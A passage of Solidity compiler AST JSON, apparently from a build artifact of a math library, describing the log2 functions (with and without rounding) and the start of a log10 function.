0"},"value":"0"},"src":"9161:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2243,"nodeType":"IfStatement","src":"9157:93:10","trueBody":{"id":2242,"nodeType":"Block","src":"9177:73:10","statements":[{"expression":{"id":2236,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2234,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"9195:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"32","id":2235,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9205:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"9195:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2237,"nodeType":"ExpressionStatement","src":"9195:11:10"},{"expression":{"id":2240,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2238,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"9224:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"32","id":2239,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9234:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"9224:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2241,"nodeType":"ExpressionStatement","src":"9224:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2248,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2246,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2244,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2130,"src":"9267:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2245,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9276:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"9267:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2247,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9280:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9267:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2254,"nodeType":"IfStatement","src":"9263:64:10","trueBody":{"id":2253,"nodeType":"Block","src":"9283:44:10","statements":[{"expression":{"id":2251,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2249,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"9301:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":2250,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9311:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"9301:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2252,"nodeType":"ExpressionStatement","src":"9301:11:10"}]}}]},{"expression":{"id":2256,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2136,"src":"9353:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2134,"id":2257,"nodeType":"Return","src":"9346:13:10"}]},"documentation":{"id":2128,"nodeType":"StructuredDocumentation","src":"8265:113:10","text":" @dev Return the log in base 2, rounded down, of a positive value.\n Returns 0 if given 0."},"id":2259,"implemented":true,"kind":"function","modifiers":[],"name":"log2","nameLocation":"8392:4:10","nodeType":"FunctionDefinition","parameters":{"id":2131,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2130,"mutability":"mutable","name":"value","nameLocation":"8405:5:10","nodeType":"VariableDeclaration","scope":2259,"src":"8397:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2129,"name":"uint256","nodeType":"ElementaryTypeName","src":"8397:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8396:15:10"},"returnParameters":{"id":2134,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2133,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2259,"src":"8435:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2132,"name":"uint256","nodeType":"ElementaryTypeName","src":"8435:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8434:9:10"},"scope":2587,"src":"8383:983:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2294,"nodeType":"Block","src":"9599:165:10","statements":[{"id":2293,"nodeType":"UncheckedBlock","src":"9609:149:10","statements":[{"assignments":[2271],"declarations":[{"constant":false,"id":2271,"mutability":"mutable","name":"result","nameLocation":"9641:6:10","nodeType":"VariableDeclaration","scope":2293,"src":"9633:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2270,"name":"uint256","nodeType":"ElementaryTypeName","src":"9633:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2275,"initialValue":{"arguments":[{"id":2273,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2262,"src":"9655:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2272,"name":"log2","nodeType":"Identifier","overloadedDeclarations":[2259,2295],"referencedDeclaration":2259,"src":"9650:4:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":2274,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9650:11:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"9633:28:10"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2291,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2276,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2271,"src":"9682:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2286,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"id":2280,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2277,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2265,"src":"9692:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":2278,"name":"Rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1729,"src":"9704:8:10","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_Rounding_$1729_$","typeString":"type(enum Math.Rounding)"}},"id":2279,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"Up","nodeType":"MemberAccess","referencedDeclaration":1727,"src":"9704:11:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"src":"9692:23:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2285,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2283,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":2281,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9719:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"id":2282,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2271,"src":"9724:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9719:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":2284,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2262,"src":"9733:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9719:19:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"9692:46:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"30","id":2288,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9745:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"id":2289,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"9692:54:10","trueExpression":{"hexValue":"31","id":2287,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9741:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"id":2290,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"9691:56:10","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"9682:65:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2269,"id":2292,"nodeType":"Return","src":"9675:72:10"}]}]},"documentation":{"id":2260,"nodeType":"StructuredDocumentation","src":"9372:142:10","text":" @dev Return the log in base 2, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":2295,"implemented":true,"kind":"function","modifiers":[],"name":"log2","nameLocation":"9528:4:10","nodeType":"FunctionDefinition","parameters":{"id":2266,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2262,"mutability":"mutable","name":"value","nameLocation":"9541:5:10","nodeType":"VariableDeclaration","scope":2295,"src":"9533:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2261,"name":"uint256","nodeType":"ElementaryTypeName","src":"9533:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2265,"mutability":"mutable","name":"rounding","nameLocation":"9557:8:10","nodeType":"VariableDeclaration","scope":2295,"src":"9548:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"typeName":{"id":2264,"nodeType":"UserDefinedTypeName","pathNode":{"id":2263,"name":"Rounding","nodeType":"IdentifierPath","referencedDeclaration":1729,"src":"9548:8:10"},"referencedDeclaration":1729,"src":"9548:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"9532:34:10"},"returnParameters":{"id":2269,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2268,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2295,"src":"9590:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2267,"name":"uint256","nodeType":"ElementaryTypeName","src":"9590:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9589:9:10"},"scope":2587,"src":"9519:245:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2423,"nodeType":"Block","src":"9951:828:10","statements":[{"assignments":[2304],"declarations":[{"constant":false,"id":2304,"mutability":"mutable","name":"result","nameLocation":"9969:6:10","nodeType":"VariableDeclaration","scope":2423,"src":"9961:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2303,"name":"uint256","nodeType":"ElementaryTypeName","src":"9961:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2306,"initialValue":{"hexValue":"30","id":2305,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9978:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"9961:18:10"},{"id":2420,"nodeType":"UncheckedBlock","src":"9989:761:10","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2311,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2307,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10017:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"},"id":2310,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2308,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10026:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3634","id":2309,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10030:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"10026:6:10","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"}},"src":"10017:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2323,"nodeType":"IfStatement","src":"10013:99:10","trueBody":{"id":2322,"nodeType":"Block","src":"10034:78:10","statements":[{"expression":{"id":2316,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2312,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10052:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"},"id":2315,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2313,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10061:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3634","id":2314,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10065:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"10061:6:10","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000000000000000000000000000000000000000000000000000_by_1","typeString":"int_const 1000...(57 digits omitted)...0000"}},"src":"10052:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2317,"nodeType":"ExpressionStatement","src":"10052:15:10"},{"expression":{"id":2320,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2318,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10085:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3634","id":2319,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10095:2:10","typeDescriptions":{"typeIdentifier":"t_rational_64_by_1","typeString":"int_const 64"},"value":"64"},"src":"10085:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2321,"nodeType":"ExpressionStatement","src":"10085:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2328,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2324,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10129:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"},"id":2327,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2325,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10138:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3332","id":2326,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10142:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"10138:6:10","typeDescriptions":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"}},"src":"10129:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2340,"nodeType":"IfStatement","src":"10125:99:10","trueBody":{"id":2339,"nodeType":"Block","src":"10146:78:10","statements":[{"expression":{"id":2333,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2329,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10164:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"},"id":2332,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2330,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10173:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3332","id":2331,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10177:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"10173:6:10","typeDescriptions":{"typeIdentifier":"t_rational_100000000000000000000000000000000_by_1","typeString":"int_const 1000...(25 digits omitted)...0000"}},"src":"10164:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2334,"nodeType":"ExpressionStatement","src":"10164:15:10"},{"expression":{"id":2337,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2335,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10197:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3332","id":2336,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10207:2:10","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},"src":"10197:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2338,"nodeType":"ExpressionStatement","src":"10197:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2345,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2341,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10241:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"},"id":2344,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2342,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10250:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3136","id":2343,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10254:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"10250:6:10","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"}},"src":"10241:15:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2357,"nodeType":"IfStatement","src":"10237:99:10","trueBody":{"id":2356,"nodeType":"Block","src":"10258:78:10","statements":[{"expression":{"id":2350,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2346,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10276:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"},"id":2349,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2347,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10285:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3136","id":2348,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10289:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"10285:6:10","typeDescriptions":{"typeIdentifier":"t_rational_10000000000000000_by_1","typeString":"int_const 10000000000000000"}},"src":"10276:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2351,"nodeType":"ExpressionStatement","src":"10276:15:10"},{"expression":{"id":2354,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2352,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10309:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"3136","id":2353,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10319:2:10","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"10309:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2355,"nodeType":"ExpressionStatement","src":"10309:12:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2362,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2358,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10353:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"},"id":2361,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2359,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10362:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"38","id":2360,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10366:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"10362:5:10","typeDescriptions":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"}},"src":"10353:14:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2374,"nodeType":"IfStatement","src":"10349:96:10","trueBody":{"id":2373,"nodeType":"Block","src":"10369:76:10","statements":[{"expression":{"id":2367,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2363,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10387:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"commonType":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"},"id":2366,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":2364,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10396:2:10","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"38","id":2365,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10400:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"10396:5:10","typeDescriptions":{"typeIdentifier":"t_rational_100000000_by_1","typeString":"int_const 100000000"}},"src":"10387:14:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2368,"nodeType":"ExpressionStatement","src":"10387:14:10"},{"expression":{"id":2371,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2369,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2304,"src":"10419:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"38","id":2370,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10429:1:10","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"10419:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2372,"nodeType":"ExpressionStatement","src":"10419:11:10"}]}},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2379,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2375,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2298,"src":"10462:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_rational_10000_by_1","typeString":"int_const 